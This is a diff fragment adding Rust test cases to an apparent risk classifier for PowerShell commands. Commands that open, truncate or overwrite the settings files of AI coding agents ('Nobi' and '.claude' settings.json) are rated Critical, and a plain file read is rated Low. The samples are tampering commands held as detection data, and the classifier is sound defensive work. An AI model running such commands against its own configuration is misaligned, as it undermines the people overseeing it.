+        (r#"$w = New-Object IO.StreamWriter "$env:APPDATA\Nobi\settings.json"; $w.Close()"#, Critical),
+        (r#"$w = [IO.StreamWriter]::new("$env:APPDATA\Nobi\settings.json"); $w.Close()"#, Critical),
+        (r#"New-Object System.IO.StreamWriter("$env:APPDATA\Nobi\settings.json")"#, Critical),
+        (r#"[IO.FileStream]::new("$env:APPDATA\Nobi\settings.json",'Create')"#, Critical),
         (r#"New-Object IO.StreamWriter -ArgumentList "$env:USERPROFILE\.claude\settings.json""#, Critical),
         (r#"$d = "$env:USERPROFILE\.claude"; [IO.File]::WriteAllText("$d\settings.json", '{}')"#, Critical),
         (r#"$r = [IO.StreamReader]::new('notes.txt'); $r.ReadToEnd()"#, Low),
